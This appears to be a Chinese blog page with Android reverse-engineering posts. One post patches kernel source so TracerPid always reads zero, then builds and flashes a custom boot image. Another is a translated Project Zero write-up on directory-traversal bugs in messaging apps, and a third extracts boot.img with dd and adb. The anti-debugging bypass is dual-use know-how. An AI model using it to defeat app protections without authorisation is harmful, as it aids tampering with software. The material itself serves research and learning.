class="line">140        &quot;t (tracing stop)&quot;,     /*   8 */</span><br><span class="line">141        &quot;Z (zombie)&quot;,           /*  16 */</span><br><span class="line">142        &quot;X (dead)&quot;,             /*  32 */</span><br><span class="line">143        &quot;x (dead)&quot;,             /*  64 */</span><br><span class="line">144        &quot;K (wakekill)&quot;,         /* 128 */</span><br><span class="line">145        &quot;W (waking)&quot;,           /* 256 */</span><br><span class="line">146 &#125;;</span><br></pre></td></tr></table></figure></p>
<p>修改之后的结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">134 static const char * const task_state_array[] 135 = &#123;</span><br><span class="line">136        &quot;R (running)&quot;,          /*   0 */</span><br><span class="line">137        &quot;S (sleeping)&quot;,         /*   1 */</span><br><span class="line">138        &quot;D (disk sleep)&quot;,       /*   2 */</span><br><span class="line">            //修改的部分</span><br><span class="line">139        &quot;S (sleeping)&quot;,         /*   4 */</span><br><span class="line">140        &quot;S (sleeping)&quot;,         /*   8 */</span><br><span class="line">141        &quot;Z (zombie)&quot;,           /*  16 */</span><br><span class="line">142        &quot;X (dead)&quot;,             /*  32 */</span><br><span class="line">143        &quot;x (dead)&quot;,             /*  64 */</span><br><span class="line">144        &quot;K (wakekill)&quot;,         /* 128 */</span><br><span class="line">145        &quot;W (waking)&quot;,           /* 256 */</span><br><span class="line">146 &#125;;</span><br></pre></td></tr></table></figure></p>
<p>修改<code>array.c</code>的第二处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">180 seq_printf(m,</span><br><span class="line">181            &quot;State:\t%s\n&quot;</span><br><span class="line">182            &quot;Tgid:\t%d\n&quot;</span><br><span class="line">183            &quot;Pid:\t%d\n&quot;</span><br><span class="line">184            &quot;PPid:\t%d\n&quot;</span><br><span class="line">185            &quot;TracerPid:\t%d\n&quot;</span><br><span class="line">186            &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;</span><br><span class="line">187            &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,</span><br><span class="line">188            get_task_state(p),</span><br><span class="line">189            task_tgid_nr_ns(p, ns),</span><br><span class="line">190            pid_nr_ns(pid, ns),</span><br><span class="line">191            ppid, tpid,</span><br><span class="line">192            cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,</span><br><span class="line">193            cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</span><br></pre></td></tr></table></figure></p>
<p>修改的结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">180 seq_printf(m,</span><br><span class="line">181            &quot;State:\t%s\n&quot;</span><br><span class="line">182            &quot;Tgid:\t%d\n&quot;</span><br><span class="line">183            &quot;Pid:\t%d\n&quot;</span><br><span class="line">184            &quot;PPid:\t%d\n&quot;</span><br><span class="line">185            &quot;TracerPid:\t%d\n&quot;</span><br><span class="line">186            &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;</span><br><span class="line">187            &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,</span><br><span class="line">188            get_task_state(p),</span><br><span class="line">189            task_tgid_nr_ns(p, ns),</span><br><span class="line">190            pid_nr_ns(pid, ns),</span><br><span class="line">               //修改部分</span><br><span class="line">191            ppid, 0,</span><br><span class="line">192            cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,</span><br><span class="line">193            cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</span><br></pre></td></tr></table></figure></p>
<h2 id="源码的编译运行"><a href="#源码的编译运行" class="headerlink" title="源码的编译运行"></a>源码的编译运行</h2><p>在编译运行之前, 我们需要先用<code>echo $PATH</code>确认交叉编译器在PATH中。<br><img src="https://i.imgur.com/VfALUlJ.png" alt></p>
<p>按照下面来进行配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ export ARCH=arm #指明目标体系架构，arm、x86、arm64</span><br><span class="line">$ export SUBARCH=arm</span><br><span class="line">$ cd msm #进入内核所在目录</span><br><span class="line">$ make hammerhead_defconfig # 设备名_defconfig</span><br><span class="line">#指定使用的交叉编译器的前缀</span><br><span class="line">$ make ARCH=arm CROSS_COMPILE=arm-eabi- -j4 ##如果没有gcc的环境, 就增加了CC=clang</span><br></pre></td></tr></table></figure></p>
<p>可以从<a href="https://source.android.com/source/building-kernels.html" target="_blank" rel="noopener">编译内核</a>这篇文章中找到相应的设备名。</p>
<p>在编译的过程中, 遇到了下面的报错。<br><img src="https://i.imgur.com/WrDEZh8.png" alt></p>
<p>这时候需要修改<code>kernel/timeconst.pl</code>文件, 用<code>vim kernel/timeconst.pl</code>编辑该文件, 定位到下述代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">372     @val = @&#123;$canned_values&#123;$hz&#125;&#125;;           </span><br><span class="line">373     if (!defined(@val)) &#123;                     </span><br><span class="line">374         @val = compute_values($hz);           </span><br><span class="line">375     &#125;                                         </span><br><span class="line">376     output($hz, @val);</span><br></pre></td></tr></table></figure></p>
<p>将<code>if (!defined(@val))</code>改为<code>if (!@val)</code>, 再编译一次就可以了。<br><img src="https://i.imgur.com/sTmrBvr.png" alt><br>接下来, 就按照上图提示进入目录<code>arch/arm/boot</code>。<br><img src="https://i.imgur.com/ytyQvDO.png" alt></p>
<h3 id="重打包boot-img"><a href="#重打包boot-img" class="headerlink" title="重打包boot.img"></a>重打包boot.img</h3><p>为了防止发生不可挽回的刷砖错误, 在刷机之前, 一定要按照<a href="https://www.52pojie.cn/thread-917096-1-1.html" target="_blank" rel="noopener">尝试绕过TracePid反调试</a>将boot.img进行备份。</p>
<h4 id="准备好bootimg-tools工具"><a href="#准备好bootimg-tools工具" class="headerlink" title="准备好bootimg-tools工具"></a>准备好bootimg-tools工具</h4><p>因为我之前Windows环境是准备好了的, 就直接在本地解决下面的任务。</p>
<p>在Ubuntu环境中, 输入下面命令就准备完成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/pbatard/bootimg-tools.git</span><br><span class="line">$ make</span><br><span class="line">$ cd mkbootimg</span><br></pre></td></tr></table></figure></p>
<p>Windows环境下进入<code>[MinGW安装的目录]]\MinGW\msys\1.0</code>目录下, 双击<code>msys.bat</code>。</p>
<p>把<a href="https://www.52pojie.cn/thread-917096-1-1.html" target="_blank" rel="noopener">提取出来的boot.img</a>放到mkbootimg文件夹下, 之后的步骤不管是哪个环境下都是相同的。</p>
<h4 id="用unmkbootimg解包"><a href="#用unmkbootimg解包" class="headerlink" title="用unmkbootimg解包"></a>用unmkbootimg解包</h4><p>在MinGW输入命令<code>./unmkbootimg -i boot.img</code>, 如果是Ubuntu, 直接去掉前面的<code>./</code>执行命令。</p>
<p>我们获得了rebuild需要输入的指令, 之后要rebuild的时候要修改一下才能用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To rebuild this boot image, you can use the command:</span><br><span class="line">  mkbootimg --base 0 --pagesize 2048 --kernel_offset 0x00008000 --ramdisk_offset 0x02900000 --second_offset 0x00f00000 --tags_offset 0x02700000 --cmdline &apos;console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1&apos; --kernel kernel --ramdisk ramdisk.cpio.gz -o boot.img</span><br></pre></td></tr></table></figure></p>
<h4 id="替换kernel重新打包"><a href="#替换kernel重新打包" class="headerlink" title="替换kernel重新打包"></a>替换kernel重新打包</h4><p><img src="https://i.imgur.com/EAnFtOB.png" alt></p>
<h4 id="刷入bootnew-img"><a href="#刷入bootnew-img" class="headerlink" title="刷入bootnew.img"></a>刷入bootnew.img</h4><p>在手机开机的情况下, 进入bootnew.img存放的目录输入下述命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ fastboot flash boot bootnew.img</span><br><span class="line">$ fastboot reboot</span><br></pre></td></tr></table></figure></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>现在到了见证奇迹的时刻了<br><img src="https://i.imgur.com/pkdj3P3.png" alt></p>
<h2 id="参考文章或其他链接"><a href="#参考文章或其他链接" class="headerlink" title="参考文章或其他链接"></a>参考文章或其他链接</h2><p><a href="http://www.cnblogs.com/a2211009/p/4265225.html" target="_blank" rel="noopener">Ubuntu 安装 JDK 7 / JDK8 的两种方式</a><br><a href="https://blog.csdn.net/zhandoushi1982/article/details/50807282" target="_blank" rel="noopener">在Ubuntu中通过update-alternatives切换java版本</a><br><a href="https://blog.csdn.net/XXOOYC/article/details/85679143" target="_blank" rel="noopener">编译Android 9.0内核源码并刷入手机</a><br><a href="https://blog.csdn.net/u012417380/article/details/73353670" target="_blank" rel="noopener">Android系统内核编译及刷机实战 （修改反调试标志位）</a><br><a href="https://source.android.com/setup/build/initializing" target="_blank" rel="noopener">搭建编译环境</a><br><a href="https://appuals.com/how-to-build-a-custom-android-kernel/" target="_blank" rel="noopener">How to Build a Custom Android Kernel</a><br><a href="https://blog.csdn.net/fly_hps/article/details/86172698" target="_blank" rel="noopener">Android源码定制添加反反调试机制</a><br><a href="https://pan.baidu.com/s/1K5LU-h8npuczj4JgjKkaWw" target="_blank" rel="noopener">Java6+Java7链接</a>  提取码：ma3i</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/04/19/尝试绕过TracePID反调试二——从源码入手/" data-id="ckrzo1bjb000gdfrt8qq50qob" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android逆向/">Android逆向</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-用Android通讯APP发消息发现的BUG" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/31/用Android通讯APP发消息发现的BUG/" class="article-date">
  <time datetime="2019-03-31T22:29:29.000Z" itemprop="datePublished">2019-03-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/31/用Android通讯APP发消息发现的BUG/">Google Zero团队：Android流行通讯APP中的BUG</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>原文地址:<a href="https://googleprojectzero.blogspot.com/2019/03/android-messaging-few-bugs-short-of.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2019/03/android-messaging-few-bugs-short-of.html</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大概一年半以前, 我对 Android的通讯和邮件客户端进行了一些测试。当时, 在这些客户端中发现了一些bug, 然而没能把这些bug组合成有效的攻击链, 所以没有将成果发到博客上。不过, 和当初想公布研究成果的想法不同, 我现在决定将研究成果分享出来。毕竟, 了解(客户端的)设计上的抉择会对安全造成什么影响, 也是一件有趣的事情。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>在研究过程中, 对Messages (Android默认的短信客户端)、 Android上的Gmail客户端、 微软 Outlook, Facebook Messenger, WhatsApp、 Signal和Telegram这些是Google Play上最流行的通讯和邮件客户端进行了测试。</p>
<h2 id="通讯客户端说明-体系结构、攻击面、测试方法"><a href="#通讯客户端说明-体系结构、攻击面、测试方法" class="headerlink" title="通讯客户端说明(体系结构、攻击面、测试方法)"></a>通讯客户端说明(体系结构、攻击面、测试方法)</h2><p>从高层次上看, 通讯客户端具有类似的体系结构, 其功能是与服务器进行通讯, 负责定位要与用户通讯的收件人, 通常还要保留通讯过程中的session。消息需要通过服务器, 再由服务器直接发给收件人, 支持端到端加密的客户端可以将消息用某种信封加密技术密封起来。</p>
<p>不同客户端使用的通讯协议是不一样的, 尽管如此, Facebook Messenger、WhatsApp 和 Telegram 还是有相似的地方的, 这些客户端通讯协议都是采用分层方法实现的, 使用该方法发送的消息可以在一个层次结构包含类型不同的字段。 Telegram使用的<a href="https://core.telegram.org/schema" target="_blank" rel="noopener">通讯协议</a>是公开的, 用它发送出的一条消息就同时包含了发送给服务器端和接收者的信息。</p>
<p>一开始，我从Facebook messenger处理未加密信息的方式入手, 没想到, 这个攻击思路颇具挑战性。发送消息的协议(如mobile和 WEB API)有挺多可以用的, 再加上在目标设备接收到消息之前消息还会经过大量处理, 这两点大大提升了找到客户端中可攻击点的难度。因此, 我决定将重点放在加密后的消息上, 因为服务器不能过滤这些邮件。</p>
<p>我没有 Facebook Messenger和 WhatsApp 的源码, 所以我只能用apktool从这些应用的APK文件中提取出smali代码来进行分析。Signal协议的普及简化了找这些应用程序的加密部分的步骤, 因为可以直接在 libsignal 中搜索字符串。之后, 我添加了一个发送消息的函数， 将消息发送到我的服务器上, 该函数还允许在加密之前对消息进行更改的选项, 这样我就可以用格式错误的加密消息来进行测试。</p>
<p>比起上面两个客户端, 测试邮件和SMS客户端会显得稍微容易些。在测试SMS客户端时, 我调用了<a href="https://developer.android.com/reference/android/telephony/SmsManager.html#sendDataMessage(java.lang.String,%20java.lang.String,%20short,%20byte%5B%5D,%20android.app.PendingIntent,%20android.app.PendingIntent" target="_blank" rel="noopener">sendDataMessage</a> API发送原始的SMS 消息。而在测试邮件客户端时, 可以直接使用 SMTP 服务器发送 MIME 邮件。</p>
<h2 id="研究结果提要"><a href="#研究结果提要" class="headerlink" title="研究结果提要"></a>研究结果提要</h2><p>有一点需要注意一下, 这些结果已超过一年, 并且通讯app的客户端的代码已有较大改动, 因此现在测试结果可能会有所不同。本文中提及漏洞均已修复。</p>
<h3 id="Messages"><a href="#Messages" class="headerlink" title="Messages"></a>Messages</h3><p>Android默认的Messages客户端主要是用 Java写的, 使用 AOSP SMS和MMS来解析消息。因此, Messages几乎不存在内存损坏漏洞。不过Android 会以不同的方式处理一些特殊的 SMS 消息, 解析这些特殊SMS消息有可能会产生漏洞。某些特殊的消息会被被解析为符合可视化语音信箱的<a href="http://www.omtp.org/OMTP_VVM_Specification_v1_3_Final.pdf" target="_blank" rel="noopener">OMTP</a>规范的信息, 而处理这些消息的过程以及可视化语音信箱的IMAP功能是 Java 实现的。在过去，Android曾经支持SUPL协议(用于 GPS 星历更新的 SMS 协议)在用户空间中解析, 并且进行解析工作的intent对象是存储在 SMS客户端堆栈中。但是, 现在高通的基带就可以直接处理这些消息, 因此处理过程不会在新的设备上的用户空间中进行。Messages客户端中存在的漏洞的主要是由处理媒体文件的库引发的, 过去大多漏洞都是在这些组件中发现的, 然而与之前相比，最近爆出的这样的漏洞少多了,再加上media是由低特权进程处理的。所以，目前我没有在Messages中发现任何漏洞。</p>
<h3 id="Gmail"><a href="#Gmail" class="headerlink" title="Gmail"></a>Gmail</h3><p>Gmail 应用程序可处理由IMAP、POP 或其他服务器发出的 MIME 消息, 这些消息的内容通常直接由非Gmail用户发出, 不过Gmail的邮件服务器还是能过滤掉一些邮件的。Gmail的客户端会调用AOSP 中的实现邮件协议底层API, 这些API和Gmail的客户端都是用Java实现的。在Gmail的客户端中, 我发现了一个由附件上传引发的目录遍历的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1342" target="_blank" rel="noopener">bug</a>。</p>
<h3 id="Outlook"><a href="#Outlook" class="headerlink" title="Outlook"></a>Outlook</h3><p>微软 Outlook 客户端的功能和Gmail的差不太多, 同样会处理另一台服务器发送的 MIME消息, 但其所有协议的处理过程都是由客户端中的代码完成的。Outlook主要是用 Java写的, 其中的native的功能和邮件本身没多大关系。和在Gmail中一样，Outlook也存在着相似<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1356" target="_blank" rel="noopener">目录遍历漏洞</a>。</p>
<h3 id="Facebook-Messenger"><a href="#Facebook-Messenger" class="headerlink" title="Facebook Messenger"></a>Facebook Messenger</h3><p>与我测试的其他通讯客户端相比, Facebook messenger 的工程量挺大的了, 很多代码很难明确其功能。该应用中包含大量的native库, 几乎每天都要从 Facebook 服务器重新加载数据动态更新。不过, 这些库好像很少直接参与消息的处理。</p>
<p>Facebook Messenger使用一种叫 “消息队列遥测传输 (<a href="http://mqtt.org/" target="_blank" rel="noopener">MQTT</a>)” 的协议与服务器进行通信——MQTT 的底层是开源的<a href="https://github.com/facebook/fbthrift/tree/master/thrift/lib/java/thrift/src/main/java/com/facebook/thrift/protocol" target="_blank" rel="noopener">Thrift协议</a>。应用中实现该协议的有Java 和 c++ 两种的库, 但好像只用了 Java 的库。我检查了协议相关代码, 没有发现Facebook Messenger的漏洞。</p>
<h3 id="WhatsApp"><a href="#WhatsApp" class="headerlink" title="WhatsApp"></a>WhatsApp</h3><p>WhatsApp 使用的分层协议主要是用 Java 实现的，该应用处理语音和视频呼叫请求的消息代码是在native代码中实现的, 我在我写的<a href="https://googleprojectzero.blogspot.com/2018/12/adventures-in-video-conferencing-part-4.html" target="_blank" rel="noopener">一篇文章</a>中讨论了相关内容。目前，我没有在 WhatsApp发现任何漏洞。</p>
<h3 id="Telegram"><a href="#Telegram" class="headerlink" title="Telegram"></a>Telegram</h3><p>Telegram是<a href="https://github.com/DrKLO/Telegram" target="_blank" rel="noopener">开源</a>的, 其 API代码是公开的。其中有相当多的native代码, 但该部分代码主要用于设备到服务器通信, 而不是端对端通信。因此，远程攻击者可用的攻击面几乎都在 Java 中。在Telegram中, 我发现了一个<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1470" target="_blank" rel="noopener">bug</a>, 同样是一个与附件相关的目录遍历漏洞。</p>
<h3 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h3><p>Signal主要由 Java实现, 攻击面相当小。虽然, 它使用的通讯协议有很好的文档记录。但是, 我没有在其中的任何漏洞。</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>总的来说, 我在这些客户端中一共发现了三个目录遍历漏洞。这些漏洞惊人地相似, 都与附件名有关，是由附件在下载时允许附件名包含特殊字符造成的。目录遍历问题在 Android 应用中非常常见,造成该漏洞的部分原因应该是 Java API 在文件名方面处理得不够严谨。</p>
<p>不过, 这些漏洞具有局限性。首先, Gmail 和 Outlook 邮件客户端中的bug仅在客户端与非标准电子邮件地址一起使用时才起作用 (即 Gmail 与非 Gmail 帐户一起使用, 或者 Outlook 与非 outlook 电子邮件地址一起使用)。虽然，Gmail 和 Outlook 邮件客户端都经常与非标准电子邮件地址一起使用, 但这些漏洞不会影响每个用户。并且想要利用这些漏洞， 还需要用户进行下载附件的操作。</p>
<p>该漏洞的利用还有一些限制条件。比如, 想要利用这些漏洞不能覆盖存在的文件, 只能往里面写入新文件。因此, 攻击者需要在某个地方放置系统可以处理但不存在的文件。但Android 上的应用程序权限有限, 通常不能在其应用程序目录之外写入。</p>
<p>上面失败之后,又有了一个绝妙的idea进入到我脑子里, 通过利用SQLite 中漏洞实现攻击, 因为Gmail 和 Outlook 都使用 SQLite 数据库来存储数据。SQLite 支持日志记录, 这意味着当 SQLite 数据库发生更改时, 会先写到日志文件里面, 防止在写入过程中系统崩溃或断电时数据库的数据丢失。如果发生系统崩溃或断电的情况, 在下次访问数据库时，就会存在一个保存着更改信息日志文件, 这时SQLite就知道要还原已更改信息。一旦信息还原完成, 日志文件就会被删除。这意味着, 可以通过在同一目录下写入具有特定名称的日志文件来更改SQLite数据库, 也满足此文件在一般情况下不存在的条件。</p>
<p>我尝试过这个方法, 并且更改了数据库, 但只能改变用户在应用中看到的邮件, 不能进行提权或执行非法操作。为了寻找更通用的方法, 我想到了可以从SQLite 解析日志文件或数据库文件的方式下手。</p>
<p>Telegram的漏洞有可能直接利用, 因为恰好有一个默认情况下不存在的配置文件, 如果该配置文件存在的话， Telegram可对处理该配置文件, 并且在处理代码中会引发一个内存损坏漏洞。不过, 我找不到一个可实现该攻击方法的邮件客户端。</p>
<p>上面失败之后,又有了一个绝妙的idea进入到我脑子里, 通过利用SQLite 中漏洞实现攻击, 因为Gmail 和 Outlook 都使用 SQLite 数据库来存储数据。SQLite 支持日志记录, 这意味着当 SQLite 数据库发生更改时, 会先写到日志文件里面, 防止在写入过程中系统崩溃或断电时数据库的数据丢失。如果发生系统崩溃或断电的情况, 在下次访问数据库时，就会存在一个保存着更改信息日志文件, 这时SQLite就知道要还原已更改信息。一旦信息还原完成, 日志文件就会被删除。这意味着, 可以通过在同一目录下写入具有特定名称的日志文件来更改SQLite数据库, 也满足此文件在一般情况下不存在的条件。</p>
<p>我尝试过这个方法, 并且更改了数据库, 但只能改变用户在应用中看到的邮件, 不能进行提权或执行非法操作。为了寻找更通用的方法, 我想到了可以从SQLite 解析日志文件或数据库文件的方式下手。</p>
<p>我用 AFL 对数据库的加载和日志处理进行了Fuzzing测试。我发现<a href="https://sqlite.org/src/info/02828d717e2d97b1" target="_blank" rel="noopener">四个漏洞</a>, 其中三个我认为是不可利用的, 剩下一个利用的可能性非常小。</p>
<p>我找不到更多的方法来利用目录遍历, 因为不能覆盖 Android 应用程序中的文件, 所以我不认为这些目录遍历漏洞对攻击者来说会特别有价值。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我测试了几个 Android 通讯和邮件客户端，发现了三个目录遍历的漏洞, 但这些漏洞的利用存在一些限制, 现在还不清楚在一般情况下这些漏洞能否被利用。</p>
<p>这些漏洞非常相似, 箭头直指Android中 Java未能正确处理文件路径方面的问题。仅在客户端与非标准电子邮件地址一起使用时, 邮件客户端中的两个漏洞才能被成功利用，尽管这种应用场景非常常见。漏洞的产生可能是邮件客户端的功能测试不足或审查不足造成的。大部分通讯客户端是用 Java 实现的, 这就增加了在应用程序中找到bug的难度, 因为不能利用内存损坏漏洞进行攻击。</p>
<p>这项研究的着重点是未经过中间件处理的邮件和消息, 攻击者可以利用这个bug向接收者发送任意数据, 客户端不会对小心进行过滤且会对数据直接进行处理。虽然这些漏洞利用起来很容易, 但它们只是消息或邮件客户端攻击面中的一部分。在将来，我很可能会投入到通讯客户端的中介服务器的功能的研究中去。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/03/31/用Android通讯APP发消息发现的BUG/" data-id="ckrzo1bja000edfrtbxlbowky" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android安全-翻译/">Android安全 翻译</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-尝试绕过TracerPID反调试一" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/14/尝试绕过TracerPID反调试一/" class="article-date">
  <time datetime="2019-03-14T23:31:14.000Z" itemprop="datePublished">2019-03-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/14/尝试绕过TracerPID反调试一/">尝试绕过TracerPID反调试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="Windows下Linux环境准备"><a href="#Windows下Linux环境准备" class="headerlink" title="Windows下Linux环境准备"></a>Windows下Linux环境准备</h2><h3 id="安装MinGW"><a href="#安装MinGW" class="headerlink" title="安装MinGW"></a>安装MinGW</h3><p>在官网下好<a href="http://www.mingw.org/" target="_blank" rel="noopener">MinGW</a>之后, 右键按下图选中要下载的，之后直接在<code>Installation</code>中直接选中<code>Apply change</code>即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552553170/aa_catmea.png" alt></p>
<p>###<br>进入安装目录<code>&lt;MinGW安装的地方&gt;\MinGW\bin</code>, 将<code>gcc.exe</code>重命名为<code>cc.exe</code>, 就短暂地这样改就好了，之后用完make工具再改回来。反正我没找到哪里可以改Makefile的内容。不这样修改的话会出现如下报错：</p>
<p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552554377/boerror_ltdeqw.png" alt></p>
<p>具体原因好像是MinGW的bug, 在Linux环境下一般gcc是等同于cc的, 然而在Windows中却不是这样的, 如果有人找到Makefile的内容可以在哪里改的话, 可以告诉我=v=, 虽然下面并没有可以评论的地方。</p>
<p><em>注：还有千万别学人家瞎改名, 把<code>mingw-make.exe</code>改成<code>make.exe</code>直接用, 这样也会报错！</em></p>
<h2 id="准备boot"><a href="#准备boot" class="headerlink" title="准备boot"></a>准备boot</h2><ol>
<li>提取boot.img <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[your username]&gt;adb shell</span><br><span class="line">shell@hammerhead:/ $ su</span><br><span class="line">root@hammerhead:/ # cd /dev/block/platform/msm_sdcc.1/by-name</span><br><span class="line">root@hammerhead:/dev/block/platform/msm_sdcc.1/by-name # ls -al</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>输入以上命令即可找到boot的位置。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552572141/boposition_jqxant.png" alt></p>
<p>将boot导出成boot.img。这里一定要注意, 要按照你自己的情况将boot导出, 要修改<code>if=/dev/block/[实际boot文件夹名]</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/mmcblk0p19 of=/data/local/boot.img</span><br></pre></td></tr></table></figure>
<p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552640930/bocorrect_whui56.png" alt></p>
<p>重新开一个命令行页面，或直接<code>exit</code>退出，输入如下指令：<br><code>adb root pull /data/local/boot.img boot.img</code></p>
<p>这里加了一个root是因为之前直接pull的时候说我权限不够。加了root之后发现还是一直失败, 就尝试先将boot.img存到<code>/sdcard/Download</code>下面之后直接用pull指令就成功了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:/sdcard/Download$ su</span><br><span class="line">root@hammerhead:/sdcard/Download# cp /data/local/boot.img /sdcard/Download/boot.img </span><br><span class="line">root@hammerhead:/sdcard/Download# exit</span><br><span class="line">root@hammerhead:/$ exit</span><br><span class="line">C:/Users/[your username]&gt; adb pull /sdcard/Download/boot.img</span><br></pre></td></tr></table></figure></p>
<p>在哪个目录下pull的，文件就会存在哪个目录下。</p>
<ol start="2">
<li>准备好bootimg-tools工具<br><code>git clone https://github.com/pbatard/bootimg-tools.git</code></li>
</ol>
<p>下载后打开文件夹到<code>[MinGW安装的目录]]\MinGW\msys\1.0</code>, 双击<code>msys.bat</code>即可进入到一个模拟Linux环境的GUN界面中。进入<code>[bootimg-tools所在文件夹]/bootimg-tools</code>(如果找不到的话可以用everything找找看), 用<code>make</code>指令生成二进制文件。</p>
<p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552574870/afmake_l4lqwi.png" alt></p>
<p>将boot.img拷到<code>[bootimg-tools所在文件夹]\bootimg-tools\mkbootimg</code>文件夹下, 执行命令<code>./unmkbootimg -i boot.img</code>。(要记录下面输出的一大段字，之后要重新生成boot.img的时候直接复制修改成相应kernel文件名和输出文件名即可)<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552641959/succesun_umfiqv.png" alt></p>
<ol start="3">
<li>提取原始zImage<br>复制<code>kernel</code>文件并将其重命名为<code>zImage.gz</code>。用<code>010 Editor</code>工具找到16进制<code>1f 8b 08 00</code>， 删掉查找到的位置的前面的所有数据,使文件变成标准的gzip压缩文件, 保存之后再执行命令<code>gunzip zImage.gz</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552650755/succesch_yoj1nf.png" alt></li>
</ol>
<p>到这里zImage文件就提取完成了。</p>
<h2 id="修改内核"><a href="#修改内核" class="headerlink" title="修改内核"></a>修改内核</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>我这里用的是IDA 7.0</p>
